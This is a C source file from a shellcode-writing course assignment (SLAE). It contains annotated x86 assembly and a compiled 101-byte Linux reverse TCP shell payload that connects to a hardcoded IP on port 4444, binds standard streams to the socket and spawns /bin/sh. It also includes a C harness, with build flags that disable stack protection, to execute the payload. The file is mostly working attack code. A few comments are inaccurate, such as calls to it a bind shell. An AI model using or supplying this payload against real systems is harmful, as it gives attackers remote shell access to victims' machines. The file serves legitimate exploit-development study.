/* Name             : Jonathan "Chops" Crosby
 * Email            : me@securitychops.com
 * Twitter          : @securitychops
 * Website          : https://securitychops.com
 * Blog Post        : https://securitychops.com/2018/05/21/slae-assignment-2-reverse-shell-tcp-shellcode.html
 * Student ID       : SLAE-1250
 * Assignment 2     : Reverse Shell TCP (Linux/x86)
 * Shellcode Length : 101 bytes
 * Shellcode Purpose: Initiate a reverse shell back to the ip address / port number on shellcode execution
 *
 * Assembly code to generate shellcode in provided C program:

; assemble/link assembly with:
; nasm -f elf32 -o shellcode.o shellcode.nasm
; ld -o shellcode shellcode.o

global _start

section .text
_start:

; for all socket based calls we will need to use socketcall
; http://man7.org/linux/man-pages/man2/socketcall.2.html
;
; the relevant calls we will need to make will be:
; -----
; SYS_SOCKET        socket(2)   0x01
; SYS_BIND          bind(2)     0x02
; SYS_CONNECT       connect(2)  0x03
; SYS_LISTEN        listen(2)   0x04
; SYS_ACCEPT        accept(2)   0x05
; -----
; due to the way the registers need to be loaded up we will need to
; make the call to cocketcall by loading the following info into
; the following registers
; -----
; eax : 0x66 (this is the value of socketcall)
; ebx : SYS_* value (0x01, etc)
; ecx : pointer to address on stack of parameters to subfunction

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; C version  :  int socket(domain, type , protocol)
; ASM version:  socketcall(SYS_SOCKET, socket(AF_INET,SOCK_STREAM,IPPROTO_IP))
; Returns    :  socketid into eax
; -----
; Param Values:
;   #define AF_INET     2   // Internet IP Protocol
;   http://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html
;
;   #define SOCK_STREAM 1   // stream (connection) socket
;   http://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html
;
;   #define IPPROTO_IP  0
;   If the protocol argument is zero, the default protocol for this address family and type shall be used.
;   http://pubs.opengroup.org/onlinepubs/009695399/functions/socket.html
; -----
; Registers before calling socketcall:
;
; /---eax---\   /---ebx---\   /--------ecx---------\
; |   0x66  |   |   0x01  |   |  byte, byte, byte  |
; \---------/   \---------/   |  0x02  0x01  0x00  |
;                             \--------------------/
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; push params to the stack last first

xor eax, eax     ; zeroing out edx to set IPPROTO_IP to 0
push eax         ; pushing IPPROTO_IP onto stack
push byte 0x01   ; pushing SOCK_STREAM onto stack
push byte 0x02   ; pushing AF_INET onto stack

mov ecx, esp     ; moving address of parameter structure into ecx

xor eax, eax     ; zeroing out eax
mov al, 0x66     ; moving socketcall value into eax

xor ebx, ebx     ; zeroing out ebx
mov bl, 0x01     ; moving SYS_SOCKET into ebx

int 0x80         ; calling interupt which triggers socketcall

; registers after calling socktcall

; /----eax----\   /---ebx---\   /--------ecx---------\
; |  socketid  |  |   0x01  |   |  *address to struct |
; \------------/  \---------/   \---------------------/

; eax now contains our socketid, since eax is volitale
; lets put it somewhere safe, like esi

xchg eax, esi    ; esi now contains our socketid
                 ; and eax contains whatever was in esi

; /----eax----\   /---ebx---\   /--------ecx---------\   /---esi---\
; |   garbage  |  |   0x01  |   |  *address to struct |  | socketid |
; \------------/  \---------/   \---------------------/  \---------/


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; C version  : connect(socketid,(struct sockaddr *)&serverAddress, sizeof(serverAddress));
; ASM version: socketcall(SYS_CONNECT, connect(socketid,(struct sockaddr *)&serverAddress, sizeof(serverAddress));
; -----
; Param Values:
;   socketid         // currently stored in esi
;
;   &serverAddress   // memory on the stack for sockaddr
;       * http://pubs.opengroup.org/onlinepubs/7908799/xns/netinetin.h.html
;       * Values of this type must be cast to struct sockaddr for use with the socket interfaces
;
;     this parameter is a struct of sockaddr_in which has the following structure
;
;     struct sockaddr_in {
;         sa_family_t    sin_family; // address family: AF_INET
;         in_port_t      sin_port;   // port in network byte order
;         struct in_addr sin_addr;   // internet address
;                   // Internet address.
;                   struct in_addr {
;                       uint32_t   s_addr; // address in network byte order
;                };
;
;     sa_family_t
;       #define AF_INET     2   // Internet IP Protocol
;       http://students.mimuw.edu.pl/SO/Linux/Kod/include/linux/socket.h.html
;
;     in_port_t // port in network byte order / big endian
;       https://en.wikipedia.org/wiki/Endianness
;       port 9876 would be: word 0x2694
;
;     sin_addr // uint32_t ia 4 bytes
;       ip bound to will be XXX.XXX.XXX.XXX
;       ip would be: dword 0xFFFF or whatever IP will end up being reversed
;
;   sizeof(serverAddress)   // this value represents bytes, so 4 bytes is 32bits
;       the value here is 16 bytes or 0x10h which is ultimaly 32bits
; -----
;
; Registers before calling socketcall:
;
; /---eax---\   /---ebx---\   /--------------------------ecx-----------------------------\
; |   0x66  |   |   0x03  |   |  socketid, mem of server address struct, size of struct  |
; \---------/   \---------/   |     esi                ecx                    0x10       |
;                             \-------------------------|--------------------------------/

; we need to create the first stack pointer for sockaddr_in

xor edx, edx

push edx

mov byte [esp]  , 0x0a   ; 10
mov byte [esp+2], 0x07   ; 07
mov byte [esp+3], 0x11   ; 17

                         ; mov byte [esp+1], 0x00 left out on purpose since
                         ; this would put 0x00 in the final shellcode, which
                         ; is generally considered bad practice since null
                         ; tends to cause issues when executing

push word  0x5C11     ; port number (0x115C is 4444 so we push little endian)

push word  0x02       ; AF_INET - which is 0x02

mov ecx, esp        ; move stack pointer to ecx

push byte 0x10      ; 16 byts long (or 32bit)

push ecx            ; pushing sockaddr_in into esp

push esi            ; sockid already in esi, so pushing it

mov ecx, esp        ; moving stack pointer to ecx

; from the previous call ebx is already 0x01
; lets increment it by one
inc ebx             ; increasing ebx from 1 to 2
inc ebx         ; and from 2 to 3

xor eax, eax        ; zeroing out eax
mov al, 0x66        ; moving socketcall value into eax

int 0x80            ; calling interupt which triggers socketcall

; registers after calling socktcall

; /----eax----\   /---ebx---\   /--------ecx---------\   /---esi---\
; |  uneeded  |  |   0x03  |   |  *address to struct |  | socketid |
; \------------/  \---------/   \---------------------/  \---------/


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; C version  :  int dup2(clientid, localDiscripToDuplicate);
; ASM version:  standard syscall using same format as above
; -----
; Param Values:
;   clientid                        // currently stored in eax
;
;   localDiscripToDuplicate         // 0, 1, 2 file descriptors to duplicate
; -----
; Registers before calling dup2:
;
; /---eax---\   /---ebx----\   /-------------ecx---------------\
; |   0x3f  |   |  sockid  |   |  file descriptor to dplicate  |
; \---------/   \----------/   |          2, 1 adnd 0          |
;                              \-------------------------------/
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


mov ebx, esi        ; moving socketid from eax to ebx

                    ; now we need a loop to run through for
                    ; 0, 1 and 2

xor ecx, ecx        ; zeroing out ecx
mov cl, 0x03        ; moving syscall for dup2

dupin:
    xor eax, eax        ; zeroing out eax
    mov al, 0x3f        ; setting syscall value for dup2
    dec cl              ; decreasing loop counter since we
                        ; will need to deal with only 2, 1 and 0
    int 0x80            ; syscall triggering listen
    jnz dupin           ; if the zero flag is not set then do it again

; registers after calling socktcall
;
; since we don't care about any return values
; we don't bother tracking register values

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; C version  :  int execve(const char *filename, char *const argv[], char *const envp[]);
; ASM version:  standard syscall using same format as above
; -----
; Param Values:
;   filename     // path of elf32 to execute
;
;   argv         // standard argv, first param is full path to elf32 null terminated
;
;   envp         // any environmental specific things, null in our case
; -----
; Registers before calling execve:
;
; /---eax---\   /----------------ebx--------------------\   /-------------ecx---------------\
; |   0x0B  |   | stack address if //bin/sh,0x00000000  |   |  stack address to 0x00000000  |
; \---------/   \---------------------------------------/   \-------------------------------/
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; call execve in order to complete the local bind shell
; execve("/bin/sh", argv[], envp[]);
; argv needs to be Address of /bin/sh, 0x00000000
; this is because when you call something from bash, etc
; argv will contain the path of the executable within it

; before starting we look like:
; execve(NOT-SET-YET, NOT-SET-YET, NOT-SET-YET)

; First we need to get 0x00000000 into ebx somehow
; so lets zero out eax and push it to esp

xor eax, eax    ; zeroing out eax to make it 0x00000000
push eax        ; pushing 0x00000000 onto the stack (esp)

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; esp now looks like: 0x00000000;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; pushing "//bin/sh" (8 bytes and reverses due to little endian)
push 0x68732f6e ; hs/n : 2f68732f into esp
push 0x69622f2f ; ib// : 6e69622f into esp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;esp now looks like: "//bin/sh,0x00000000";
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; since we have been pushing to the stack, we have been pushing to esp
; now we need to get "//bin/sh,0x00000000" into ebx since it is the first parameter for execve
; since esp contains exactly what we need we move it to ebx

mov ebx, esp    ; moving the param to ebx
                ; ebx now contains "//bin/sh,0x00000000"

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; now we look like: execve("//bin/sh,0x00000000", NOT-SET-YET, NOT-SET-YET);
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; now we need to get 0x00000000 into edx
push eax        ; eax is still 0x00000000 so push it to esp
mov  edx, esp   ; we need to move a 0x00000000 into
                ; the third parameter in edx

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; now we look like: execve("//bin/sh,0x00000000", NOT-SET-YET, 0x00000000);
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; the second parameter is needs to be "//bin/sh,0x00000000"
; which we can accomplish by moving ebx onto the stack
; and then moving esp into ecx since it will be on the stack

push ebx        ; pushing "//bin/sh,0x00000000" back to the stack
mov  ecx, esp   ; moving the address of ebx (on the stack) to ecx

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; now we look like: execve("//bin/sh,0x00000000", *"//bin/sh,0x00000000", 0x00000000);
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

; loading syscall execve
mov al, 0x0B    ; syscall for execve is 11 dec / 0x0B hex
int 0x80

*/

#include<stdio.h>
#include<string.h>

//compile with: gcc shellcode.c -o shellcode -fno-stack-protector -z execstack

unsigned char code[] = \
"\x31\xc0\x50\x6a\x01\x6a\x02\x89\xe1\x31\xc0\xb0\x66\x31\xdb\xb3\x01\xcd\x80\x96\x31\xd2\x52\xc6\x04\x24\x0a\xc6\x44\x24\x02\x07\xc6\x44\x24\x03\x11\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\x43\x31\xc0\xb0\x66\xcd\x80\x89\xf3\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{
    printf("Shellcode Length:  %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}